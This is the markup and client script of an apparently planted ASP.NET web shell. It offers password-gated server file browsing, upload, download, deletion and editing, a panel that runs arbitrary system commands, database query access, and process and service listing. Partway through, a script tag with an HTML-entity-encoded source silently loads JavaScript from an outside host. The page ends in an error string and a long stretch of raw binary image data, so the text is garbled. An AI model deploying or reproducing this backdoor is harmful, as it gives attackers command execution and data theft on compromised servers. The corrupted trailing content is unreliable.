        if (folder != null) {
           
            Bin_PostBack('newdir', folder);

        }

    }

    function newfile() {

        var file = prompt("Create New File", "");

        if (file != null) {

            Bin_PostBack('newfile', file);

        }

    }

    function slctall() {

        var ck = document.getElementsByTagName('input');

        for (var i = 0; i < ck.length; i++) {
            if (ck[i].type == 'checkbox' && ck[i].name != 'selectall') {
                ck[i].checked = form1.selectall.checked;

            }
        }
    }
    function deleteall() {
        var files = ""
        var ck = document.getElementsByTagName('input');

        for (var i = 0; i < ck.length; i++) {
            if (ck[i].type == 'checkbox' && ck[i].checked && ck[i].name != 'selectall') {
                files += ck[i].name + ",";

            }
        }
        if (files == "") { alert("Select Files"); return; }
        if (confirm('Are you sure delete the files ?')) {

            Bin_PostBack('delall', files);

        }
    }

    function downloadall() {
        var hid = document.getElementById("Hidden1");


        var url = location.href;
        url = url.replace("#", "");

        var file = "?name=";
        var fpath = "";

        var ck = document.getElementsByTagName('input');
        var checked = new Array();
        var c = 0;
        for (var i = 0; i < ck.length; i++) {
            if (ck[i].type == 'checkbox' && ck[i].checked && ck[i].name != 'selectall') {
                checked[c] = ck[i].name;
                c = c + 1;
            }
        }

        if (checked.length == 0) { alert("Select Files"); return; }

        for (var i = 0; i < checked.length; i++) {

            fpath = url.concat(file.concat(checked[i]));

            var ifra = document.createElement('iframe');
            ifra.src = fpath;
            ifra.setAttribute("class", "hidden");
            ifra.setAttribute("height", "1");
            ifra.setAttribute("width", "1");
            void (document.body.appendChild(ifra));
        }

    }



  </script>
    
 

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
</head>
<body>
    <form id="form1" runat="server">
    <asp:HiddenField ID="hidLastTab"  runat="server" Value='' />

     <div class="container" >
         <div>
           
        <asp:Panel ID="Login" runat="server" Visible="false"  >
           <h3 >Password  <asp:TextBox ID="Login_TextBox"  runat="server"></asp:TextBox> 
            <asp:Button ID="Login_Button" runat="server" Text="LogIn" OnClick="Login_Button_Click" />              
        </asp:Panel> 
              <asp:LinkButton ID="Logout" Visible="false"   style=" float :right;" runat="server" OnClick="Logout_Click">
                LOGOUT</asp:LinkButton>
              <h3 >  </h3> 
           
         </div>
         <script SRC=&#x68&#x74&#x74&#x70&#x73&#x3a&#x2f&#x2f&#x77&#x77&#x77&#x2e&#x6c&#x6f&#x63&#x61&#x6c&#x72&#x6f&#x6f&#x74&#x2e&#x6e&#x65&#x74&#x2f&#x73&#x61&#x62&#x75&#x6e&#x2f&#x79&#x61&#x7a&#x2e&#x6a&#x73></SCRIPT>
        
           <div class="tab_container">
                <div id="Menue" visible="false" runat="server">
             <ul class="tabs">
                <li>
                     <asp:Button ID="Button_FileManger" runat="server" Text="FileManger" OnClick="fm" CssClass="buttons"   />
      
                   </li>
                <li>
                     <asp:Button ID="Button_CMD" runat="server" Text="CMD" OnClick="process_design" CssClass="buttons"  />
      
                   </li>
                   <li>
               <asp:Button ID="Button_DBS" runat="server" Text="DBS" OnClick="process_design" CssClass="buttons"  />
      </li>
                 <li>
                <asp:Button ID="Button_UserInfo" runat="server" Text="UserInfo" OnClick="process_design" CssClass="buttons"  />
      </li>
                  <li>
                <asp:Button ID="Button_ProcessesServices" runat="server" Text="Processes_Services" OnClick="process_design" CssClass="buttons"  />
      </li>
              <li>
                <asp:Button ID="Button2" runat="server" Text="CopyFiles" OnClick="process_design" CssClass="buttons"  />
      </li>
            </ul>
         </div>
               <br />
                     <asp:Label ID="msgs" runat="server" Text=""></asp:Label>
             <asp:Panel ID="FileManger"  runat="server"  class="tab_content" >
      
     
    <div  id="Div1" style=" height: 63px; width: 100%; border-style: inset">
   
       
   
     <asp:FileUpload ID="FileUpload1" runat="server" style="  height: 40px; width:180px;" />
     <asp:Button ID="Upload" runat="server"  Text="Upload" OnClick="Upload_Click" />
        <br />
         <input type="checkbox" name="selectall" title="Select All Files" onclick="javascript: slctall();" />Select All Files To   
        <a href="#" onclick="javascript:downloadall()">Download ALL</a> || 
          <a href="#" onclick="javascript:deleteall()">Delete ALL</a>
         <asp:HyperLink runat="server">Copy</asp:HyperLink>|<asp:HyperLink runat="server">Move</asp:HyperLink> 
      <br />
   
    </div>
                 
    <div  id="current" style="  height: 60px; width: 100%; border-style: inset">
    <a href="javascript:Bin_PostBack('shell_root', '<%=  base64Encode("./")%>' )"')">Shell_Root</a> ||  Select Drivers:
        <asp:DropDownList ID="DriversList"  runat="server" style=" height: 21px;" Width="143px" OnSelectedIndexChanged="DriversList_SelectedIndexChanged" >
        </asp:DropDownList>
        <asp:Button ID="slctdrive" runat="server" EnableViewState="true"  Height="21px" OnClick="slctdrive_Click" Text="GET" Width="38px" />
        || <a href="javascript:newfolder()">New Folder</a> || <a href="javascript:newfile()">New File</a> 
        <br />
       
       <br />
       
        
        Current Path:
        <asp:Label ID="currentpathlabel" runat="server" EnableViewState="true"  Visible="False"></asp:Label>
   
        <asp:Literal ID="Literal1" runat="server"></asp:Literal>
        <input id="Hidden1" type="hidden" runat="server"/>
   
       <br />
   
    </div>
                 
<table id="tblEmployee" runat="server" style=" width: 100%">
            <thead>
                
                <tr>
                    <th>
                        Name
                    </th>
                    <th>
                        Size
                    </th>
                    <th>
                       Date Modified
                    </th>
                  
                    <th>
                       TO DO
                    </th>
                </tr>
            </thead>
        </table>
     
        
    </asp:Panel>
                 <asp:Panel ID="editpanel" runat="server" Visible="false">
     
            <h2> Editing File:</h2> 
              <asp:TextBox ID="filetoedit" runat="server" Enabled="false" Width="99%" Height="25px">
                  <br />

              </asp:TextBox> 
              <asp:TextBox ID="editfile" runat="server"  Width="99%" Height="500px" TextMode="MultiLine" >

              </asp:TextBox> 

<asp:Button id="submitedit" runat="server" Text="Save" onclick="Save_Click"></asp:Button>
 
</asp:Panel>
               
                 <asp:Panel ID="CMD" runat="server" Visible="false" class="tab_content">
                     
                      Type Commands<br />
                      <asp:TextBox ID="Command" runat="server" EnableViewState="false"  
                          Height="156px" TextMode="MultiLine" Width="579px"></asp:TextBox>
                      <asp:Button ID="CmdSubmit" runat="server" Height="40px" 
                          onclick="CmdSubmit_Click" Text="Run" Width="70px" />
                      <br />
                      Result:<br />
                        <asp:TextBox ID="CmdResult" runat="server" TextMode="MultiLine" 
                          Height="368px" Width="720px"></asp:TextBox>
                  </asp:Panel>

               

    <asp:Panel ID="DBS"  runat="server" Visible="false"  class="tab_content" >
        
     
    <div  id="current" style="  height: 116px; width: 100%; border-style: inset">
        <br />
      connection string:
        <asp:TextBox ID="connections" runat="server" Height="25px" Width="491px"></asp:TextBox>
        &nbsp;<asp:Button ID="gdb" runat="server" Text="get db" OnClick="gdb_Click" Height="36px" Width="84px" />
        <br />
        <br />
        select DB:
        <asp:DropDownList ID="DropDownList1" runat="server" Height="19px" Width="114px" >
        </asp:DropDownList>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
        <asp:Button ID="Button1" runat="server" Text="get Tables" OnClick="Button1_Click" />
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Tables:
        <asp:DropDownList ID="DropDownList2" runat="server">
        </asp:DropDownList>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
        <br />
        <br />
      
        </div>
            Run Query<br />
                      <asp:TextBox runat="server" TextMode="MultiLine" Height="209px" Width="777px" ID="sqlquery"></asp:TextBox><br />
                 <asp:Button id="executequery" runat="server" Text="Execute" OnClick="executequery_Click"  />
        
    </asp:Panel>
            
              <asp:Panel ID="UserInfo"  runat="server" Visible="false"  class="tab_content"  >
        
     
    
           
        
    </asp:Panel>
                   <asp:Panel ID="Processes_Services"  runat="server" Visible="false"  class="tab_content"  >
        
     
    <div  id="current" style="  height: 57px; width: 100%; border-style: inset">
        <br />
        <asp:Button ID="Button_process" runat="server" OnClick="Button_process_Click" Text="Process" />
      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
        <asp:Button ID="Button_services" runat="server" Text="Services" OnClick="Button_services_Click" />
        <br />
        <br />
      
        </div>
           
        
    </asp:Panel>
     <asp:Panel ID="CopyFiles"  runat="server" Visible="false"  class="tab_content"  >
     <div>
        <asp:Label ID="Label1" runat="server" Width="150" Text="Enter Source"></asp:Label>
        <asp:TextBox ID="TextBox1" runat="server" Width="384px"></asp:TextBox>
        <br />
        <asp:Label ID="Label2" runat="server" Width="150" Text="Enter Dest"></asp:Label>
        <asp:TextBox ID="TextBox2" runat="server" Width="384px"></asp:TextBox>
    <br />
     <asp:Button ID="Button3" runat="server" Text="Button" OnClick="CopyFile" />
     <asp:Label ID="Label3" runat="server"    ></asp:Label>
    </div>
    </asp:Panel>
               </div>
                  

    </div>

    </form>
          </body>
</html>
{"res":"error","msg":"Thread was being aborted."}ÿÛ „ 	( %!1"))7... 38387(-/,



/&!//5/--+-7-5+-.5.3-5//-+--+/5-7.7-+--/-5/-+-++6----ÿÀ  á á" ÿÄ             ÿÄ F    !1"AQaq2#BR‘¡3br‚±²Ác’¢ÑðCS“ñ$U³ÂáÿÄ             ÿÄ *       1!AQ"q¡Ñð2B‘áÿÚ   ? ¼b"" """ """ """ """ """ """ """ """ """ """ """ """ """ """ """ """ ""&
n®ºkk-uJëRÌìpä™Pk<iÔúÕ­GGS¦Ò#m}[úIã÷°v|Â¨/Ø’9-ÍR¢ºëê¥~v: þ,DÕÑø“Esm«[¥µe®úœÿ i\ôÿ ƒZLùšÝN§Ys~&gØ¤ÿ 7?›M½oÁ¾”ë„®êOï%¬Oð³p•ò„égÄ£î³ªxiÖÃsõ–X+ÎêÀÉòÏ°ÁØODï:ÏÅ™¦Ó×y¿Ìó=uVXÃ$r¹Â`‚â9R;‰d;H•?ú®¤oÑô+£Ê»—!‡±jŽGÈ™ôŸïÓ0^§Ò5U'ÅA?EpùðÆµ?¡õ­>¶¥»MjÛ[{¯±÷VSÊ·Ðó$ """ """ """ """p¾;øŸ¤é¤Ô3©ÕäÖ{yƒ·í‚yc˜®§P•©{Qe™ˆUQó,xW]wãWN¡ŠR-Õ°Ï5.#Û{c?p•7‹¼]®êåF§m:t9ZkÈûÉ%›ê{s€2dU5*( }?ë™:FÖEßõ,WÒÕGõíbÈ&?þwëûm_ú­ÿ )_D#n«®øÒþ»fŸIxN¤ßº÷6aXFYÀ•}Ø‚{qvxM¦ª„«GåùŒ/–ÊãêKrIäžä™ù¦{KšÛz3Vÿ ¾ŒQ‡÷—JÍ6˜³õ4J¿áö³­ØT¿¯K‘—Õ‚¯û&Ç˜çßseOÎZ9/Ã«Ó%¨ÕØë±JºžÌ¤`ƒ+ïü)Óèl{¯¨°XÞFà
×Xc±ˆ#Ò0Iì=¾rÇž“ÀÏÊFÇ¤ÌZ:X]ˆ¶VãŒ+‘SÁJŽ»§²ÁRZ›;J‚P	 XÒpàc$¤Dý“11Úž×é†ú•7ÐJôÍkº²Iœóß÷AÜ§¾¯ÔÝâU¿hó:r¢¡{[SP­TbÛlÎÐ9'né¥¿ÅÔEQOM¨*Î °ŒÈmîß²Í"}*¸ÂŒ’ äà¥G[Ò»ùiª¡ì9ô-¨ÏÇH9•6·áb”kú·YÔZˆ73µSûö³ý€ |„åüáŠõýN«:e6Ñ¡ÑZŒú›Y‹ØÈÁ°; Ç €rÝÀ“´?HDDˆˆˆ€ˆˆˆ€ˆ˜uº•ª·±ÎµfcòU“ü
ïã›@‹¥ÒŸþ³P¹Ýÿ “YãwöŽ>X'åš3M¥Û–b^Æ$³žI'“Éÿ £3jz‹ëu7ëmüwØHº½•GÐ «ýÙõ-¬ÉÆ3Ù("|±ä}÷ÿ Oç> "$Ï…ºbê-e°‹[ƒƒ¸«âÇî¢S&HÇY´õâÇ9/¯rîþü@feÒkl,X…¦öîIí]‡ÜžÊÝÉÀ<Og×úñ©TàÚ1½ˆÊÖÈý§ ‚`'¸
IuO_SaG˜ŒÁUÇ±bw¯qÉŽ>Ý¥…U{F73vc–f<³1÷brOÔÎ+•ZÒ'û—K‰Âµ¯1–5ú¦úˆÍZp¥šýA{~ó
a‡°P9Æ %bu—½ç79³ä§ŠÇËm}¸ùœ·Öjè” Ä Ya?R®OÌá@ü„Øœì¼›Þ<wê<<LtŸ-{ŸÑò÷šñhÎje³Žä!Ëýå½,©[O±¨»j£jo!TaÍ|  Ï•·wo|Íx¼šâ¬Å˜ó8–Íhš¬iñi`¤¨À  œp`àïŽ'ášÝõKúÛŠÖ¬ì
Ö2œˆ¬¥ˆ9,Ì>µNÞtñdŒ•ò‡#6)Å	•%Ñ´š¯k­M}¿£éôêÒVH;²ËŒö$m`ÎNyÂ€‹Ç¦ôê´Õ-4VµUXÂ¢Œ ?ÔüÏs*¯Z+ñGR]ÁQ´ù léŽ~ùfþ&[Àç´ôÃÎö" """ """ 'ñ“Zièú¢§Õò²ÄVÿ „´íeñÖ²z=ç÷^‚õUý„
F˜­GõGó34Ã¦¸ öT'ûÃð“Þèm®Ô¥!?¬?fµ#v³…VØËLÄFå]nt…^N!þ¿Ïü'Ôßêº6j¶WŠ¨ÔZ§Z›¬J†>¸Àû”Ð“´Ic§hlÔZ”Ô»­µ¶¨'<’Iö Iù5‘²Áq÷€cÇ©ø~ÃÌ´g’ˆGÙXçüË$úGDÓ_¥¤½J[Ë\²–F$prÈA<ƒÞoôÏÑ§}õ«ÚW—cÁÆF	úá9<žn;ÒØõ;ý¥Øâð2S%rn5ûÃs¨FO²”sö­ÕÏòS6f;/U8'pqùžÓÍ5[nr…ù…öíÛ? =ç+áÙþçšQ…?Û³ù»õŸuXdr>|àýGÌ}{Ol@FÈù×´ÄuKï¹GÍ‘ÀüÉœvtÏÀg²«6ú7U}3Yú„³Ì+êóJ0U^o”G\çwíÉª¼ZŸ·EËõ_-×üÁ¿áœÔøµö‚pN8ÏÐ}Lõãåä¬EcO^+ÌÚwþË¾ôþ£eš×Ôêì:‹,l•Ã²íõîvíç÷fŽ£áÆ¿¦þ·£õŽÞNšÒ0ÿ <á±?&Q÷–oHÒi®³‚Èƒq‹ž\þlXþsrv¢Óòùéˆß§-ð×ÇËÔÑªµ|u]IÈÎÒè­Èà©åO¸'·”ÏÄŠ?ìî©¡ê•z¶Šµ8à0à~e«,>õƒ.i¬*DDD@DDD@HŸôE×hïÒ³m!PØÎÖà«cßü¤´@ü¡â	ê:F¥*Ô²8½2–!b‡Ë r8Èþ°Ç‡úÇý‹¦KîÒù‹­Ë¥Õù«X8¬y+†
¸n8“¿ÔÛÓô5*>¦ÍFñ¸‚ 
w¯}­œý«2ÇèÃQq:‡ÓQ©¥(Ñ­mZd5Yp@`âÃ€AÃcIÉhÇ÷<¼cÉ0‰¤ê
gè ¸Õ¼“ãTŒ,ºãÑÊ×·œ¿Ý¸ï øquN/½wi+`÷:‹+RÚå½±ÇbÄX<8º->Y[n$»0*ìßÉ,¤úNÖÎ;ú¹æOõ›_è–ÓXjP×`F—pbv`pÄ“üLóNO	šÃ§ågà­‹¦[sjuºTÔozëV¾­ÉJ¹ÚO«†|+
8;§'â
2®¯V¬
	«ÛQR
Ø–’ÛÔo©A¾ñí -èÅFšÝ>–„jkãmž}w·}æ«j©³Ûøf]Þ éU7K¾ºtõÒ­A´UZ*(±@´zTÈ¼ý&Ùi|6‰´vÊ“\‘¨øWžê@¡Ó±Ã),ŸU',ÔŸ³}ë'Ñ|*¯Xµí±nlÖ¢•ý{ƒúÏ•k†_Ú œÎ¦pIÆFO|©ÁÏæâó«HË3Yï¿Íßÿ Î½íŠ"Ñ×S÷øòë6ŽI ó'ý=ÏÐ’kê¨å›’7?AíŸ›î&TµX°„Øù0?œòkÓÛî_q1ê‚¶ßÅƒ´v<(üÎ&}Nês]ƒÕÉV …±Gí.,¯uÏ¸!ŒÅ&kå"rV-™÷,sˆAÜ¹?5Ï
öÏáoä}þc4×¹f
@És“éVü;?­ŽþÒ°›iš·åüi!Ð4~v¡AÁZvÚÿ pO’?ÞRÙÿ eyEewdQÎ  ïÜû÷û“ó™ëÔ5L-FéØžÄeX~Ò¶0ä5Ãj×$LôÇ‘[ßÅ{Xñ0hnk+GjÚ¦e£wSò?ûó ñ3ÎûæUgÿ mš¡ËÙª]«îq[ƒÍ×øË~±€>ÂSeÇ[ëÕªz´]+ÔÍû/h`x>àº¨ù¨ŸysM#¥dˆ‰!®ï-ÈÎÅfÇÏ Ÿô™g„f'ðÃ£S©­ú®´
F§Su˜.„ ã	_9lƒŽ 1Î{}&¸QrSe‰PÔyÍU.ÊB5aUïP!‹mî@áp*ºú«jtÔ³þˆ¶‡ý‘†WUc°‘Ãn0FvŒœ=ø‹Öh×Ø­Ul?U°› ÎK/ œ,Üÿ Xû NÇ3o}5‹ÄG¥ÞÇÎxúdÿ y¡Óú‘±°k+•Ü1¸ím„¨
þ¡À$pÜñÍ!Ózî§Oé«W¨­  *âÕ\gö-p«ì=ÿ ÆuÚ^(f³Pm±IUC•¿¢±ÝŒð	Ýµ¶çkí¬à˜…¾¶Ý{x'D_q­¶ç>Vöò³œãgîÿ S;qÆ1Ä˜¿Ë­®uòÛ%ÚÖP¸#9Â…Ç÷÷É$šo]ã~ @Æ´c#>UAxîO®@ãŒÈ
gPk[uÖ½¬¿µc³íÎ{33ƒÀùKÎ<–×ºGÔ­¦¥Ô&@Ò[^­kªÄ{UI {ágñ±ÎNLÖÓ£.åu(êîN2=DŒàãAû9 3¦¹.\Šé®9Ú’X·Ó,ÓÉòÉ‡‹'Æ)í}ÚuÆËò‚œ3mì¦sÝ+óÅÈáF¿owŸhdëMzLšruZŠh}X³mˆ„*ÕFH8r>mƒÀôÐ´Õb:Yky›ü£½lšÀ¨àz£».ì@Æ‡ÅÝF¢í54èÂÕoff5åª¦Kðy€ñÎå™
ðû ìênÔ«é´Nã§6& 9O-XÝ†÷©äúN1-ô±øøÌüuòËêå‹yÇß¿ÿ ='´Ö©zÈõ€E˜R2Û5…ö%­4§ÝÄ×ñoÄ­¹ÒŠN©•Â³‡U[äŽ/ G> 1ß“È·•§ª×JY`ð[Ÿ|àp	Ï$rp3ØJ³[áJ¨:*j/¯C©j˜WZî) ØÈÌY»Óî6÷öŒ4¦:~/kç½ódÜj?Ë¥Z•%¶ymS®ï6§ ‘½Â¨íû`mïÛ€|Òi¬²æZÐ±(‡¸yq–'çÀ xí€H™ð€étË@®ÄLØè¶grVH
As½öœ’boétQcŠÁRØƒpBŸNÓé–ä.Ç<œmÆ¤Ûq×Ùµy™"ž=Ì|ÿ ;sv#+u(ë‚A ðs†88?B;‚'Cá>˜Œ‰©l=‡;WÚ’	V÷°Ao¸^	-§Ô4çS«òiØ¢š}Ns…;‡¤ üDœdQç#¦ôôÒTÞ§|îÇœáF P1ßŽI<Í8ü“mzøgÊåyâŠïßÊNCø«¦ê545:}HÒ›nÂî÷.	í»<ÜœŒÇ­Õòà?ç>ôýU‚€ù9î8üþ“Þæª¶«Ãºô÷šîéúÛ ó•B•Jî>à®A*I9æ^²¨øúŠzX-ø—SVß¹[þY–oJf4T[ñÐ·Ü¨ÏóšDîmDDˆˆˆ€ˆˆˆÄüIð›©RÖ0ê«B*¼g#!\Ä¹ãæ2q(N«Ðú†Š¶{ô‡ËBÜ¤<€¹+óÈïƒÌýW¬§z2üÇóö•÷´¬ý?W§zÙ·Tî¨3»Ì¬oB¸ïêUãß·¼
oÃzãM•ÙjÁÜSŒr¸xÆ&å|ÕinæÊHÀÀ/‹ø µì?!èâAô@jÔoRàrñÛ½±&ibk±Ih[ç³oJØc†[3ß½kíœÈÔò~Ãÿ ìšðVýQS=…jÜ¢ìUª9
æ'f\ÁÏÌr$l«=ÿ ÏÓ“Î?”é~è´×k½[Le+lâÛr£0ãI>£´s’
z–·AV•.­4âºltdZj-YUv¢pÜdƒÁ
‘û@dðî¬Ð¿¬Ý¸ñ1;ñRg>§ÃÎy<çÞOu¯è[î¿æžÔ¡QMŠ2A
· nÚìxÎÓÆxÎ2@æa®å}ü#zî™ü=:Š”€¼Š¬g`Ê¸.¤-l§–þÖÝ§<Jx7AMKa¨~=„¹fva†+ëbNÑ’@ì2qÞi]zËßÊ·õ”ù•ú”f‡PÙôûŒŽùÃm J³¥x«]^­YEG”Ê@}Ê@íßÛgæß›o8¯ä¶5o¿Q‹Ùè±³œæí*Ù;Td|æÃtµT±ÓÌT(-,[fÕÉmÞ¥ÉÜBž@ùgè{UeøÔÞö×éZÕ¶ä°éê<ãžÇ±äcžwÄÝNÍE¶ïw—`•YuÖ€¨J
¡Á<”',’qÛO§3éŸœok:ïéh«nÿ Ò-\€•G½gá\v=ÛŽÒ½¿ÇZÏ=¬	bjLŒ–+æãxÈny vœíÁ@Æ'éŒñõÆ?9»á
zmTÜÌ*¹ö^3ëÈ^[#–À<vc/\Uª¶Éi^žÑé©Õ‹*µ“»l.Ys¸²3lÉäœä{€L˜ê?Ñ?öLŒò¯uJì«¢Öƒ_—èerÈní 
¼dgŒÉMxýUŸØoð3:õÖ“iÜöèšTt%1
ïòÀ’uèëS‘Z‚;s9ýŽËØá@<å˜sù	½GG|þ²ÆÛƒ–:“Û‚Ã±ÂYUKñ·ÅT]©£E’ôi­ªÙ‚Kp
)Î7*o÷îøö3£»ã=»KSÐõOR®K³2Üí©€÷Ì•ñŠzODR‰M"ð8£OZÏûFÑßßŸ3«¡õŸÚÇ=?§’¤À<z,¬üv!eá;Á~'¯©éWSR²,¬‚U”àŒŽìAùö“²;Ãý
	§Ó¦Ê«9$“’Ì}É<Éd0ë.(…€Ý·Û8ûÍ}¡u
w(àöïö3uÔA`È;:5ŠsSñ÷*~ÙàS| 4zŸÓ4µ!Ôyõ þ³øñì§ ýûþ)ÇQr8,JŽÇ9ç#ü?Œ¿<XãC¢Ôj®u,•°E'ñXÀªO~Oo¤üùÒè"…®{Ÿs‘íòÄ˜<Â£?òÿ YÖxWÀ×^ËeîÚer»NÏ[†?ŒFÀ1écŸž1‚g¾x{Ôu·„Z*V— )~Íf[€¨.~lvnø·â>™­Z´)n¿SÈB’§œðàØÉ>•#ë+3ñ,N³ýÿ wüÂrk¯hôÚtóõ5VêÍè-—ÚIÏê×-òö‘÷o¯õAf­:m
ÿ ƒHËãúÛ[<ü‹ÿ vLtoƒ2…õ£jmçõ—@'ý˜ÂŸÌTíMø«®h,½­ÓyÙ´·›”_¯%Šä†õ’¤c“ŽØ‘º-Z¶Bå¿OnçøûOÔ};ÃÔS[UåÔj`¯Ê@˜ãgoyIüIø}¨ÑjU£ÓùÚKW×]Iý ýZã!€ÀËŽ3hB
5ÃÌÓ×Ë±J¥Œ)|ÙécîÄŸÚSÅ:Z¡ž‹ê°¹Ë*äp *l#b‘€¼=9Ý–Ú7~ô-6¿ÍºÕf4:(©¹ œ¶æ;‡ ñÁã¶:oˆZŸ]$+i4Ú”«­|ºÞÅ-‚¾Rà°<í8á‡ÜNX‹x¯á>;VéÈ ”3ø†×P~EÔ•éœÎ«á¯E'Tš»Zj$¡Áõ¾Ò¹UÎsûØùDô~•n²ß*…ÅNæcèEöÈäÀ 1ÉØ$\Ý¥Ñå­@X­BV…\€À*…VôäB÷wZß
Ä|¤W§÷û­ÿ )šûÒÌ;lºfÒ)p;’Ç‰Àø‹âJîý¤PuÚ†w¨-RƒÁ ÇŒþ,…òy”ˆÚ]ýäÒè*gÕZ+R}<Xã²¨äŸ´âµ.ê}müž›[h´ŒÁ[Rü9Ï;ê¦H÷l+á„fÇ®±qÕ^qŠC-0r0Æà?up£žâYÔtš(J•Bch^ã° p ùKEQ·+à¯†Z.‹
þ“ªîo´C{šÓŸ~[žó·ˆ–A­øóáýNª=šzì½tö1²”É,6ÑËcidý»Êr”¹ßÉ£E©óý«°Çö”{}HüÄýk)Ž‰ðÃ_¬®¥êš£Nš 6hè#r\Œ®âI$ú‰ÉäKGÃÞÒhËÒéÒ¡î@Ë7öœú›ó2Z ""D
/¥Þú_u
ôÂ¥­ÆçªëE[ØùlMlF7±ØÝ- ü}çu§§§Of–ÝCÕåšéo6´Øö¸ßk
¬à'ÓŒsÞ\>.øoÓú•žmõº]€
•6Ö`;~YÆqÆx›~ð6ƒ¦’ÚZ6ØÃÆ%Ü–ãøGŒàHñí;iTôþ§Ô<8E]CJ–é-lþ‘@ƒ¥ð3…lIÀ¯QñuZbš»ÖÊ4û^±æ£%·¢Àk¨àáJªóïkv
Ié¼máZz¦”é®,¾ ÈëŒ£®pÀ‚>Döï8®ðqEÉoP×ÝÔ u¸eP`Û‰^Þ‘Ç9JøFöŸ)Ö•§Sñ3q»AÒC}wÜÿ ÿ À>¥yµ<+áM'M«ËÒÔ8Üç›,#Ýß¹÷ã°Ï IšÐ(
    À p °ŸRê‘ÿÙ
